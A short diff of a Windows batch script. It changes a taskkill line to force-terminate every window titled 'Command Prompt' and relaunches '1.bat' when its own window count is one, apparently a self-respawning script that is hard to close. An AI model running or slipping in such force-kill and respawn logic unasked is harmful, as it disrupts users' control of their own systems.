@@ -8,7 +8,7 @@ TITLE %n%
 FOR /F "tokens=* USEBACKQ" %%F IN (`tasklist /FI "WINDOWTITLE eq ^%n^%" ^| find/c "exe"`) DO (
 SET windowcount=%%F
 )
-taskkill /FI "WINDOWTITLE eq Command Prompt"
+taskkill /F /FI "WINDOWTITLE eq Command Prompt"
 IF "%windowcount%"=="1" (
 START 1.bat
 )
